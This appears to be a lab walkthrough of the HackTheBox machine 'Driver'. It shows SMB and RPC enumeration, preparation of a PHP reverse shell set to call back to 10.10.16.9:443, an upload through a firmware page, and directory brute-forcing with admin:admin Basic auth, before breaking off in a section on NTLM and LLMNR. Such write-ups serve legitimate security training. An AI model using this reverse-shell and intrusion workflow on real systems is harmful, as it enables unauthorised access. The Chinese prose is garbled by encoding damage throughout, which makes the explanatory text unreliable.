<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> bash -c <span class="string">&#x27;echo &quot;10.129.40.36 driver.htb&quot; &gt;&gt; /etc/hosts&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ç¡®è®¤ä¸€æ‰‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">tail</span> -n 1 /etc/hosts </span><br><span class="line">10.129.40.36 driver.htb</span><br></pre></td></tr></table></figure>

<p>æ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œè·å¾—çš„åŸŸåä¸æ˜¯å¿…é¡»æœ¬åœ°è§£æï¼Œå¦‚æœç«™ç‚¹é»˜è®¤çš„å†…å®¹å’Œç»‘å®šåŸŸåçš„å†…å®¹æ˜¯â¼€æ ·çš„ï¼Œhostsæ˜¯å¦è§£æå°±å®Œå…¨â¼€æ ·äº†ã€‚</p>
<p>ç»è¿‡æµ‹è¯•å‘ç°èƒ½å¤Ÿä¸Šä¼ å›ºä»¶è¿›è¡Œæµ‹è¯•ï¼š</p>
<img src="/posts/23837ad8/1732291828380.png" class="" width="1732291828380">

<p>â»šâ¾¯è¯´ï¼šâ€<strong>é€‰æ‹©æ‰“å°æœºå‹å·å¹¶ä¸Šä¼ ç›¸åº”çš„å›ºä»¶æ›´æ–°åˆ°æˆ‘ä»¬çš„â½‚ä»¶å…±äº«ã€‚æˆ‘ä»¬çš„æµ‹è¯•å›¢é˜Ÿå°†â¼¿åŠ¨å®¡æ ¸è¿™äº›ä¸Šä¼ å†…å®¹ï¼Œå¹¶å¾ˆå¿«å¯åŠ¨æµ‹è¯•ã€‚</strong>â€œ</p>
<p>ä½ èƒ½æƒ³åˆ°ä»€ä¹ˆï¼Ÿå®ƒè¯´ä¼ åˆ°â½‚ä»¶å…±äº«ï¼Œ<code>445ç«¯â¼</code>æ˜¯å¼€æ”¾çš„ï¼Œå€¼å¾—å»çœ‹çœ‹ã€‚<code>æŠ€æœ¯æ ˆæ˜¯php</code>ï¼Œå¯ä»¥ä¸Šä¼ &#96;php</p>
<p>åå¼¹shell&#96;çœ‹èƒ½å¦æ‰§â¾ï¼Œä½†â¼€èˆ¬smbä¸ä¼šæ˜¯webâ½¬å½•ï¼Œå…¶å®å¯ä»¥ä¸å°è¯•ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ nxc smb driver.htb --shares -u redteamnotes -p <span class="string">&#x27;&#x27;</span></span><br><span class="line">SMB 10.129.40.36 445 DRIVER [*] Windows 10 Enterprise</span><br><span class="line">10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 10.129.40.36 445 DRIVER [-] DRIVER\redteamnotes:</span><br><span class="line">STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>åº”è¯¥ä¹Ÿæ˜¯è¿æ¥ä¸ä¸Šçš„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ smbclient -L 10.129.40.36 -N</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\kali]:</span><br><span class="line">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<p>135ç«¯â¼ä¹Ÿæ˜¯å¼€æ”¾çš„ï¼Œå¯ä»¥è·å¾—â¼€äº›ä¿¡æ¯å—ï¼Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ rpcclient -U <span class="string">&quot;&quot;</span> -N 10.129.40.36</span><br><span class="line">Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<p>â½†æ³•è¿æ¥ï¼Œâ¼€èˆ¬ä¹Ÿå¯ä»¥â½¤<code>enum4linux</code>æšä¸¾â¼€ä¸‹ï¼Œå»ºè®®ä½¿â½¤è¿™ä¸ªâ¼¯å…·çš„æœ€æ–°ç‰ˆï¼Œå³<code>enum4linux-ng</code>ï¼Œå¯ä»¥åœ¨kaliä¸­ç›´æ¥å®‰è£…ï¼Œ <code>sudo apt install enum4linux-ng</code> å³å¯.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/aptlabs]</span><br><span class="line">â””â”€$ enum4linux-ng driver.htb</span><br><span class="line">ENUM4LINUX - next generation (v1.3.3)</span><br><span class="line">==========================</span><br><span class="line">| Target Information |</span><br><span class="line">==========================</span><br><span class="line">[*] Target ........... driver.htb</span><br><span class="line">[*] Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">[*] Random Username .. <span class="string">&#x27;mvwarusw&#x27;</span></span><br><span class="line">[*] Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">[*] Timeout .......... 5 second(s)</span><br><span class="line">===================================</span><br><span class="line">| Listener Scan on driver.htb |</span><br><span class="line">===================================</span><br><span class="line">[*] Checking LDAP</span><br><span class="line">[-] Could not connect to LDAP on 389/tcp: timed out</span><br><span class="line">[*] Checking LDAPS</span><br><span class="line">[-] Could not connect to LDAPS on 636/tcp: timed out</span><br><span class="line">[*] Checking SMB</span><br><span class="line">[+] SMB is accessible on 445/tcp</span><br><span class="line">[*] Checking SMB over NetBIOS</span><br><span class="line">[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out</span><br><span class="line">=========================================================</span><br><span class="line">| NetBIOS Names and Workgroup/Domain <span class="keyword">for</span> driver.htb |</span><br><span class="line">=========================================================</span><br><span class="line">[-] Could not get NetBIOS names information via <span class="string">&#x27;nmblookup&#x27;</span>: timed out</span><br><span class="line">=======================================</span><br><span class="line">| SMB Dialect Check on driver.htb |</span><br><span class="line">=======================================</span><br><span class="line">[*] Trying on 445/tcp</span><br><span class="line">[+] Supported dialects and settings:</span><br><span class="line">Supported dialects:</span><br><span class="line"> SMB 1.0: <span class="literal">true</span></span><br><span class="line"> SMB 2.02: <span class="literal">true</span></span><br><span class="line"> SMB 2.1: <span class="literal">true</span></span><br><span class="line"> SMB 3.0: <span class="literal">true</span></span><br><span class="line"> SMB 3.1.1: <span class="literal">true</span></span><br><span class="line">Preferred dialect: SMB 3.0</span><br><span class="line">SMB1 only: <span class="literal">false</span></span><br><span class="line">SMB signing required: <span class="literal">false</span></span><br><span class="line">=========================================================</span><br><span class="line">| Domain Information via SMB session <span class="keyword">for</span> driver.htb |</span><br><span class="line">=========================================================</span><br><span class="line">[*] Enumerating via unauthenticated SMB session on 445/tcp</span><br><span class="line">[+] Found domain information via SMB</span><br><span class="line">NetBIOS computer name: DRIVER</span><br><span class="line">NetBIOS domain name: <span class="string">&#x27;&#x27;</span></span><br><span class="line">DNS domain: DRIVER</span><br><span class="line">FQDN: DRIVER</span><br><span class="line">Derived membership: workgroup member</span><br><span class="line">Derived domain: unknown</span><br><span class="line">=======================================</span><br><span class="line">| RPC Session Check on driver.htb |</span><br><span class="line">=======================================</span><br><span class="line">[*] Check <span class="keyword">for</span> null session</span><br><span class="line">[-] Could not establish null session: STATUS_ACCESS_DENIED</span><br><span class="line">[*] Check <span class="keyword">for</span> random user</span><br><span class="line">[-] Could not establish random user session: STATUS_LOGON_FAILURE</span><br><span class="line">[-] Sessions failed, neither null nor user sessions were possible</span><br><span class="line">=============================================</span><br><span class="line">| OS Information via RPC <span class="keyword">for</span> driver.htb |</span><br><span class="line">=============================================</span><br><span class="line">[*] Enumerating via unauthenticated SMB session on 445/tcp</span><br><span class="line">[+] Found OS information via SMB</span><br><span class="line">[*] Enumerating via <span class="string">&#x27;srvinfo&#x27;</span></span><br><span class="line">[-] Skipping <span class="string">&#x27;srvinfo&#x27;</span> run, not possible with provided credentials</span><br><span class="line">[+] After merging OS information we have the following result:</span><br><span class="line">OS: Windows 10 Enterprise 10240</span><br><span class="line">OS version: <span class="string">&#x27;10.0&#x27;</span></span><br><span class="line">OS release: <span class="string">&#x27;1507&#x27;</span></span><br><span class="line">OS build: <span class="string">&#x27;10240&#x27;</span></span><br><span class="line">Native OS: Windows 10 Enterprise 10240</span><br><span class="line">Native LAN manager: Windows 10 Enterprise 6.3</span><br><span class="line">Platform <span class="built_in">id</span>: null</span><br><span class="line">Server <span class="built_in">type</span>: null</span><br><span class="line">Server <span class="built_in">type</span> string: null</span><br><span class="line">[!] Aborting remainder of tests since sessions failed, rerun with valid</span><br><span class="line">credentials</span><br><span class="line">Completed after 37.96 seconds</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰æ›´å¤šæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œç°åœ¨æ˜¯<strong>èƒ½ä¸Šä¼ </strong>ï¼Œä½†æ˜¯<strong>ä¸èƒ½è®¿é—®</strong>ï¼Œ<strong>ä¸çŸ¥é“ä¸Šä¼ ä¹‹åçš„â½‚ä»¶ä½ç½®</strong>ã€‚æ ¹æ®æŠ€æœ¯æ ˆï¼Œä¸Šä¼ â¼€ä¸ªphpåå¼¹shellâ½‚ä»¶ï¼Œ<strong>å°è¯•â½¬å½•çˆ†ç ´ã€‚</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> updatedb </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ locate reverse-shell </span><br><span class="line">/usr/share/laudanum/php/php-reverse-shell.php</span><br><span class="line">/usr/share/laudanum/wordpress/templates/php-reverse-shell.php</span><br><span class="line">/usr/share/metasploit-framework/docs/metasploit-framework.wiki/How-to-use-areverse-shell-in-Metasploit.md</span><br><span class="line">/usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php</span><br><span class="line">/usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/php-reverseshell.php</span><br><span class="line">/usr/share/webshells/perl/perl-reverse-shell.pl</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php</span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ vim shell.php </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ grep -i <span class="string">&quot;change this&quot;</span> shell.php </span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;10.10.16.9&#x27;</span>; // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 443; // CHANGE THIS</span><br></pre></td></tr></table></figure>

<p>åœ¨å¦‚ä¸‹é¡µé¢ä¸Šä¼ ï¼š</p>
<img src="/posts/23837ad8/1732292323766.png" class="" width="1732292323766">

<p>åœ¨ç›®å½•çˆ†ç ´å‰ï¼Œè€ƒè™‘åˆ°é¡µé¢æœ‰è®¤è¯ï¼Œè®¤è¯æ—¶burpæ‹¦æˆªè¯·æ±‚å¤´ï¼š</p>
<img src="/posts/23837ad8/1732292448583.png" class="" width="1732292448583">

<p>å³ï¼š<code>Authorization: Basic YWRtaW46YWRtaW4=</code>ã€‚ç„¶åå¼€å§‹çˆ†ç ´ï¼š</p>
<p>ä½¿ç”¨<code>feroxbuster</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver] </span><br><span class="line">â””â”€$ feroxbuster -u http://driver.htb -x php -H <span class="string">&quot;Authorization: Basic YWRtaW46YWRtaW4=&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-listlowercase-2.3-medium.txt</span><br><span class="line">___ ___ __ __ __ __ __ ___ </span><br><span class="line">|__ |__ |__) |__) | / ` / \ \_/ | | \ |__ </span><br><span class="line">| |___ | \ | \ | \__, \__/ / \ | |__/ |___ </span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher ğŸ¤“ ver: 2.10.3 </span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">ğŸ¯ Target Url â”‚ http://driver.htb</span><br><span class="line">ğŸš€ Threads â”‚ 50</span><br><span class="line">ğŸ“– Wordlist â”‚ /usr/share/seclists/Discovery/WebContent/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">ğŸ‘Œ Status Codes â”‚ All Status Codes!</span><br><span class="line">ğŸ’¥ Timeout (secs) â”‚ 7</span><br><span class="line">ğŸ¦¡ User-Agent â”‚ feroxbuster/2.10.3</span><br><span class="line">ğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml</span><br><span class="line">ğŸ¤¯ Header â”‚ Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">ğŸ” Extract Links â”‚ <span class="literal">true</span></span><br><span class="line">ğŸ’² Extensions â”‚ [php]</span><br><span class="line">ğŸ HTTP methods â”‚ [GET]</span><br><span class="line">ğŸ”ƒ Recursion Depth â”‚ 4</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">ğŸ Press [ENTER] to use the Scan Management Menuâ„¢</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">301 GET 2l 10w 148c http://driver.htb/images =&gt;</span><br><span class="line">http://driver.htb/images/ </span><br><span class="line">200 GET 185l 379w 4279c http://driver.htb/index.php </span><br><span class="line">200 GET 217l 461w 5119c http://driver.htb/fw_up.php </span><br><span class="line">200 GET 709l 4309w 366212c http://driver.htb/images/ricoh.png </span><br><span class="line">200 GET 185l 379w 4279c http://driver.htb/ </span><br><span class="line">[####################] - 21m 415268/415268 0s found:5 errors:30 </span><br><span class="line">[####################] - 21m 207629/207629 168/s http://driver.htb/</span><br><span class="line">[####################] - 21m 207629/207629 168/s </span><br><span class="line">http://driver.htb/images/</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>gobuster</code>ä¹Ÿæ˜¯okdï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ gobuster <span class="built_in">dir</span> -u http://driver.htb -U admin -P admin -x php -w /usr/share/wordlists/dirb/common.txt </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url: http://driver.htb</span><br><span class="line">[+] Method: GET</span><br><span class="line">[+] Threads: 10</span><br><span class="line">[+] Wordlist: /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes: 404</span><br><span class="line">[+] User Agent: gobuster/3.6</span><br><span class="line">[+] Auth User: admin</span><br><span class="line">[+] Extensions: php</span><br><span class="line">[+] Timeout: 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images (Status: 301) [Size: 148] [--&gt;</span><br><span class="line">http://driver.htb/images/]</span><br><span class="line">/Images (Status: 301) [Size: 148] [--&gt;</span><br><span class="line">http://driver.htb/Images/]</span><br><span class="line">/index.php (Status: 200) [Size: 4279]</span><br><span class="line">/Index.php (Status: 200) [Size: 4279]</span><br><span class="line">/index.php (Status: 200) [Size: 4279]</span><br><span class="line">Progress: 9228 / 9230 (99.98%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>å‡å¹¶æ²¡æœ‰å®è´¨æ€§å‘ç°ã€‚å…¶å®è¿˜æœ‰å¾ˆå¤šåŠæ³•äº¤å‰éªŒè¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ ffuf -c -H <span class="string">&#x27;Authentication: Basic YWRtaW46YWRtaW4=&#x27;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u</span><br><span class="line">http://10.10.16.9/FUZZ -e .php,.zip,.txt,.pdf </span><br><span class="line"> /<span class="string">&#x27;___\ /&#x27;</span>___\ /<span class="string">&#x27;___\ </span></span><br><span class="line"><span class="string"> /\ \__/ /\ \__/ __ __ /\ \__/ </span></span><br><span class="line"><span class="string"> \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ </span></span><br><span class="line"><span class="string"> \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ </span></span><br><span class="line"><span class="string"> \ \_\ \ \_\ \ \____/ \ \_\ </span></span><br><span class="line"><span class="string"> \/_/ \/_/ \/___/ \/_/ </span></span><br><span class="line"><span class="string"> v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">:: Method : GET</span></span><br><span class="line"><span class="string">:: URL : http://10.10.16.9/FUZZ</span></span><br><span class="line"><span class="string">:: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-</span></span><br><span class="line"><span class="string">2.3-medium.txt</span></span><br><span class="line"><span class="string">:: Header : Authentication: Basic YWRtaW46YWRtaW4=</span></span><br><span class="line"><span class="string">:: Extensions : .php .zip .txt .pdf </span></span><br><span class="line"><span class="string">:: Follow redirects : false</span></span><br><span class="line"><span class="string">:: Calibration : false</span></span><br><span class="line"><span class="string">:: Timeout : 10</span></span><br><span class="line"><span class="string">:: Threads : 40</span></span><br><span class="line"><span class="string">:: Matcher : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">:: Progress: [1102800/1102800] :: Job [1/1] :: 66666 req/sec :: Duration:</span></span><br><span class="line"><span class="string">[0:00:21] :: Errors: 1102800 ::</span></span><br></pre></td></tr></table></figure>

<p>å¯åŒæ—¶å¼€å¤šä¸ªç›®å½•æ‰«æå¹¶å‘è¿›è¡Œï¼Œæé«˜æ•ˆç‡</p>
<h4 id="æ”»å‡»é¢åˆ†æï¼š"><a href="#æ”»å‡»é¢åˆ†æï¼š" class="headerlink" title="æ”»å‡»é¢åˆ†æï¼š"></a>æ”»å‡»é¢åˆ†æï¼š</h4><p>æ¥ä¸‹æ¥è¯¥æ€ä¹ˆåŠï¼Ÿ è¿™â¾¥éœ€è¦çŸ¥è¯†å‚¨å¤‡ï¼Œéœ€è¦å¯¹windowså†…â½¹ã€smbã€å†…â½¹åè®®ç­‰ç­‰æœ‰æ·±åˆ»çš„ç†è§£ï¼Œæ‰å¯èƒ½æ„å»ºæ”»å‡»åœºæ™¯ï¼Œå½“ç„¶ä¹Ÿéœ€è¦è¯•é”™ï¼Œæ¯•ç«Ÿå³ä½¿ç†è§£smbä¸‹çš„â½¹ç»œæœºåˆ¶ï¼Œæœ‰â¼¿æ®µè§¦å‘åº•å±‚å†…â½¹åè®®ï¼Œä½†ä½œä¸ºâ¿Šç›’æµ‹è¯•ï¼Œè¿˜æ˜¯è¦çŒœï¼Œè¦ä¸æ–­å°è¯•è¯•ã€‚</p>
<p>è¿™é‡Œæ¶‰åŠä¸‰ä¸ªâ½…â¾¯çš„çŸ¥è¯†ç‚¹ï¼š<strong>å†…â½¹è®¤è¯æœºåˆ¶ã€å†…â½¹åè®®å’ŒSMB</strong></p>
<ul>
<li><p><code>å†…ç½‘è®¤è¯æœºåˆ¶</code>ï¼šå†…â½¹è®¤è¯æœºåˆ¶æ˜¯â¼€ä¸ªâ¼´æ³›â½½å¤æ‚çš„è¯é¢˜ï¼Œä½†è¿™â¾¥é™åˆ¶åœ¨é€‚â½¤smbç›¸å…³çš„è®¤è¯ã€‚â¾®åŸŸç¯å¢ƒä¸‹ï¼Œâ¼€èˆ¬æ˜¯ntlmåŠ å¯†ã€‚è¿™å¥—åŠ å¯†ä½“ç³»ï¼Œæ—©æœŸå«åšLM (LAN Manager)ï¼Œå®‰å…¨æ€§â¾®å¸¸ä½ï¼Œç”±äºå®ƒä½¿â½¤ç®€å•çš„å“ˆå¸Œç®—æ³•ï¼ˆä¸åŒ…å«ç›å€¼ï¼‰ï¼Œå¹¶å°†å¯†ç åˆ†å‰²æˆ7ä¸ªå­—ç¬¦çš„å—åå†åˆ†åˆ«å“ˆå¸Œï¼Œä½¿å…¶ææ˜“è¢«æš´â¼’ç ´è§£ã€‚å†ä¹‹åæ˜¯<strong>NTLMv1</strong>ï¼Œâ½LMæœ‰æ›´å¥½çš„å®‰å…¨æ€§ï¼Œä½†ä»å¯è¢«è¾ƒå®¹æ˜“åœ°ç ´è§£ï¼Œç‰¹åˆ«æ˜¯å½“æ”»å‡»è€…èƒ½å¤Ÿæ•è·åˆ°â½¹ç»œä¸­çš„è®¤è¯æµé‡æ—¶ã€‚å½“å‰â¼´æ³›ä½¿â½¤çš„ç‰ˆæœ¬æ˜¯<strong>NTLMv2</strong>ï¼Œå®ƒè¿›â¼€æ­¥å¢å¼ºäº†å®‰å…¨æ€§ï¼Œé€šè¿‡å¼•â¼Šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„æŒ‘æˆ˜å“åº”ï¼Œä»¥åŠåœ¨å“ˆå¸Œè¿‡ç¨‹ä¸­ä½¿â½¤HMAC-MD5ï¼Œè¿™ä½¿å¾—å®ƒâ½å‰ä¸¤è€…æ›´éš¾è¢«ç ´è§£ã€‚ä½†åœ¨æŸäº›æ¡ä»¶ä¸‹ï¼Œç‰¹åˆ«æ˜¯ä½¿â½¤å¼±å¯†ç æ—¶ï¼Œä»ç„¶å­˜åœ¨è¢«è¢«æš´â¼’ç ´è§£çš„å¯èƒ½ã€‚</p>
</li>
<li><p><code>å†…ç½‘åè®®</code>ï¼šå†…â½¹åè®®ï¼Œå†…â½¹ä¸­å¯ä»¥â½¤dnsè§£æä¸»æœºååˆ°ipï¼Œä½†å†…â½¹å¹¶ä¸â¼€å®šâ¼€ç›´æœ‰dnsï¼Œâ¼€èˆ¬å†…â½¹ä¸­åœ¨æ²¡æœ‰dnsçš„æ—¶å€™ï¼Œè§£æåè®®å°±ä¼šé™çº§ï¼Œé™ä¸º<strong>NBT-NS (NetBIOS Name Service)</strong> å’Œ <strong>LLMNR (Link-Local Multicast Name Resolution)</strong> è¿™ç§â¼´æ’­çš„åè®®ï¼Œsmbå°±æ˜¯ä½¿â½¤çš„è¿™ç§é™çº§åè®®ã€‚</p>
</li>
